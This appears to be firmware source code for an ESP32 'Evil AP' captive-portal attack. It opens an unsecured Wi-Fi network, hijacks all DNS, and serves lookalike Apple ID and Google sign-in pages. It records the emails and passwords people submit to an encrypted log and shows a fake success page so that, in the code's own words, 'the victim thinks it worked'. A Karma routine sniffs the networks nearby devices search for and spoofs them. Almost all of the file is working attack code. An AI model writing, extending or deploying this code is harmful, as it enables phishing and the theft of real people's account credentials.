// ============================================================================
// evilap.cpp - EvilAP / captive portal (see evilap.h)
// ----------------------------------------------------------------------------
// Uses the synchronous WebServer on port 80 + a minimal UDP DNS responder.
// The DNS hijack answers EVERY name with our AP IP, which triggers the
// captive-portal popup on phones/laptops.
// ============================================================================
#include "evilap.h"
#include "config.h"
#include "crypt.h"
#include "hw.h"
#include "webserver.h"
#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <DNSServer.h>
#include <vector>

namespace evilap {

static WebServer* web = nullptr;
static DNSServer* dns = nullptr;
static String s_ssid;
static Stats s_stats;

bool running()   { return web != nullptr; }
Stats stats()    { return s_stats; }

// ---------------------------------------------------------------- templates
// NOTE: deliberately simple brand-styled pages - functional lookalikes rather
// than pixel-perfect clones. Custom /portal.html overrides everything anyway.
static const char* TPL_GENERIC = R"html(<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>WiFi Login</title>
<style>body{font-family:sans-serif;background:#f0f2f5;display:grid;place-items:center;min-height:100vh}
.c{background:#fff;padding:32px;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.15);width:300px;text-align:center}
input{width:100%;padding:10px;margin:6px 0;border:1px solid #ccc;border-radius:6px;box-sizing:border-box}
button{width:100%;padding:10px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:16px}</style></head>
<body><div class="c"><h2>WiFi Reconnection Required</h2>
<p>Please sign in to continue using this network.</p>
<form method="POST" action="/"><input name="email" placeholder="Email or username" required>
<input name="password" type="password" placeholder="Password" required>
<button>Sign In</button></form></div></body></html>)html";

static const char* TPL_APPLE = R"html(<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Apple</title>
<style>body{font-family:-apple-system,sans-serif;background:#f5f5f7;display:grid;place-items:center;min-height:100vh;margin:0}
.c{background:#fff;border-radius:18px;padding:40px;width:280px;text-align:center}
input{width:100%;padding:12px;margin:8px 0;border-radius:10px;border:1px solid #d2d2d7;box-sizing:border-box}
button{width:100%;padding:12px;background:#0071e3;color:#fff;border:none;border-radius:10px;font-size:15px}
h2{font-weight:600}</style></head><body><div class="c">
<svg width="44" height="44" viewBox="0 0 384 512"><path fill="#000" d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/></svg>
<h2>Sign in with your Apple ID</h2><form method="POST" action="/">
<input name="email" placeholder="Apple ID" required>
<input name="password" type="password" placeholder="Password" required>
<button>Sign In</button></form></div></body></html>)html";

static const char* TPL_GOOGLE = R"html(<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in - Google Accounts</title>
<style>body{font-family:Roboto,sans-serif;display:grid;place-items:center;min-height:100vh;margin:0;background:#fff}
.c{border:1px solid #dadce0;border-radius:8px;padding:48px 40px;width:300px;text-align:center}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}
button{float:right;padding:10px 24px;background:#1a73e8;color:#fff;border:none;border-radius:4px}
h2{font-weight:400}img{margin-bottom:16px}</style></head><body><div class="c">
<img width="92" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E">
<h2>Sign in</h2><p>to continue to Gmail</p>
<form method="POST" action="/"><input name="email" placeholder="Email or phone" required>
<input name="password" type="password" placeholder="Enter your password" required>
<button>Next</button></form></div></body></html>)html";

std::vector<String> templateNames() { return {"Generic WiFi", "Apple", "Google"}; }

String renderTemplate(const String& name) {
    if (name == "Apple")  return TPL_APPLE;
    if (name == "Google") return TPL_GOOGLE;
    return TPL_GENERIC;
}
String renderCustom() {
    String html;
    if (decryptFromFile("/portal.html.enc", html) && html.length()) return html;
    // plain custom page also supported
    File f = SD_MMC.open("/portal.html", FILE_READ);
    if (f) { html = f.readString(); f.close(); if (html.length()) return html; }
    return renderTemplate("Generic WiFi");
}

// ---------------------------------------------------------------- core
// OSes detect captivity by probing known URLs (captive.apple.com,
// connectivitycheck.gstatic.com, msftncsi...). Answer those with a 302 so
// the "sign in to network" popup actually appears; everything else gets the
// portal page directly.
static bool isCaptiveProbe() {
    String host = web->hostHeader();
    host.toLowerCase();
    return host.indexOf("apple") >= 0 || host.indexOf("gstatic") >= 0 ||
           host.indexOf("google") >= 0 || host.indexOf("msftncsi") >= 0 ||
           host.indexOf("msedge") >= 0 || host.indexOf("firefox") >= 0 ||
           host.indexOf("connectivitycheck") >= 0 || host.indexOf("nmcheck") >= 0;
}

static void servePortal() {
    s_stats.hits++;
    web->send(200, "text/html", renderCustom());
}

static void handleNotFoundOrProbe() {
    if (isCaptiveProbe()) {
        String ip = WiFi.softAPIP().toString();
        web->sendHeader("Location", "http://" + ip + "/", true);
        web->send(302, "text/plain", "");
        return;
    }
    servePortal();
}

static void handleRootGet() {
    // Direct IP visits get the page; probes get redirected (popup trigger).
    if (isCaptiveProbe()) return handleNotFoundOrProbe();
    servePortal();
}

static void handleRootPost() {
    // Grab whatever fields were submitted (email/user/pass style names).
    String summary = "";
    for (int i = 0; i < web->args(); i++) {
        summary += web->argName(i) + "=" + web->arg(i);
        if (i < web->args()-1) summary += " | ";
    }
    logLine("[EVILAP] captured: " + summary);
    // Encrypted append (read-modify-write via our AES helpers).
    String existing;
    decryptFromFile("/logs/creds.enc", existing);
    existing += String(millis()/1000) + "s " + summary + "\n";
    encryptToFile("/logs/creds.enc", existing);
    s_stats.captures++;

    // Success theater so the victim thinks it worked.
    web->send(200, "text/html",
        "<!DOCTYPE html><html><head><meta charset='utf-8'>"
        "<meta http-equiv='refresh' content='5;url=/'></head>"
        "<body style='font-family:sans-serif;text-align:center;padding-top:80px'>"
        "<h2>&#10003; Authentication successful</h2>"
        "<p>You are being connected to the network...</p></body></html>");
}

static volatile bool s_stopRequested = false;
static void handleDisable() { s_stopRequested = true; }   // deferred: deleting
                                                         // the server from
                                                         // inside its own
                                                         // handler = UAF

// ---- Karma implementation ----
static portMUX_TYPE s_karmaMux = portMUX_INITIALIZER_UNLOCKED;
// Probe requests (mgmt subtype 0x40) carry the requested SSID at offset 38.
// We hop channels with promiscuous mode and tally every unique SSID.
static bool s_karmaProbing = false;
static std::vector<std::pair<String,uint32_t>> s_probes;

static void IRAM_ATTR karmaSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 40 || len > 512) return;
    const uint8_t* p = pkt->payload;
    if (p[0] != 0x40) return;                 // probe request
    uint8_t ssidLen = p[37];
    if (ssidLen == 0 || ssidLen > 32) return; // 0 = wildcard probe, skip
    if (38 + ssidLen > (int)len) return;
    String ssid((const char*)(p+38), ssidLen);
    // tally in the sniff callback is unsafe for std::vector across tasks;
    // probe requests arrive in WiFi task - use a simple critical section
    portENTER_CRITICAL(&s_karmaMux);
    for (auto& e : s_probes) {
        if (e.first == ssid) { e.second++; portEXIT_CRITICAL(&s_karmaMux); return; }
    }
    if (s_probes.size() < 32) s_probes.push_back({ssid, 1});
    portEXIT_CRITICAL(&s_karmaMux);
}


bool karmaProbing() { return s_karmaProbing; }

// DESIGN DECISION (user-approved): probing runs OFFLINE with direct channel
// hopping (Marauder/WifiPhisher style) - single radio can't serve the AP.
// Management AP returns when probing stops. UI reviews the probe list after.
static volatile bool s_karmaRun = false;
static void karmaHopTask(void*) {
    uint8_t ch = 0;
    while (s_karmaRun) {
        ch = (ch % 13) + 1;
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        delay(700);
    }
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_AP);
    WiFi.softAP(cfg.wifiSSID, cfg.wifiPass);
    logLine("karma: probing stopped - AP restored");
    vTaskDelete(nullptr);
}
static TaskHandle_t s_karmaHopTask = nullptr;

void karmaStart() {
    if (s_karmaProbing || web) return;     // portal busy
    s_probes.clear();
    WiFi.mode(WIFI_AP_STA);                // AP stays up!
    esp_wifi_set_promiscuous(true);
    const wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&karmaSniffCb);
    s_karmaRun = true;
    s_karmaProbing = true;
    xTaskCreatePinnedToCore(karmaHopTask, "karmahop", 4096, nullptr, 1, &s_karmaHopTask, 0);
    logLine("karma: probe sniffing started (offline mode)");
}

void karmaStop() {
    if (!s_karmaProbing) return;
    s_karmaRun = false;
    s_karmaProbing = false;                // hop task restores AP
}

bool karmaSpawn(const String& ssid) {
    if (!s_karmaProbing) return false;
    s_karmaRun = false;
    s_karmaProbing = false;
    delay(400);                            // hop task restores AP first
    // Bring the portal up under the probed name (channel the victim used
    // doesn't matter - clients scan for the SSID)
    return start(ssid, "");
}

std::vector<std::pair<String,uint32_t>> karmaProbeList() {
    portENTER_CRITICAL(&s_karmaMux);
    auto copy = s_probes;
    portEXIT_CRITICAL(&s_karmaMux);
    return copy;
}

bool start(const String& ssid, const String& htmlName) {
    if (running()) stop();
    s_ssid = ssid.length() ? ssid : "Free WiFi";
    (void)htmlName;   // template selection happens at serve time via SD file

    WiFi.mode(WIFI_AP);                       // radio handed over entirely
    WiFi.softAP(s_ssid.c_str());              // OPEN network

    dns = new DNSServer();
    dns->start(53, "*", WiFi.softAPIP());     // wildcard -> captive portal

    web::suspend();                           // portal takes over port 80

    web = new WebServer(80);
    web->on("/", HTTP_GET,  handleRootGet);
    web->on("/", HTTP_POST, handleRootPost);
    web->on("/disable", HTTP_GET, handleDisable);
    web->onNotFound(handleNotFoundOrProbe);   // any URL = portal (captive behavior)
    web->begin();

    g_state.evilApRunning = true;
    logLine("EvilAP started: \"" + s_ssid + "\" at " + WiFi.softAPIP().toString());
    return true;
}

void stop() {
    if (!running()) return;
    web->stop(); delete web; web = nullptr;
    dns->stop(); delete dns; dns = nullptr;
    // Restore normal management AP from saved settings.
    WiFi.mode(WIFI_AP);
    WiFi.softAP(cfg.wifiSSID, strlen(cfg.wifiPass) >= 8 ? cfg.wifiPass : "dongle1234");
    g_state.evilApRunning = false;
    web::resume();                            // give management UI port 80 back
    logLine("EvilAP stopped - normal interface restored");
}

void handle() {
    if (!running()) return;
    if (dns) dns->processNextRequest();
    if (web) web->handleClient();
    // Tear down AFTER the request completes - /disable must not free the
    // object that's currently serving it.
    if (s_stopRequested) { s_stopRequested = false; stop(); }
}

} // namespace evilap
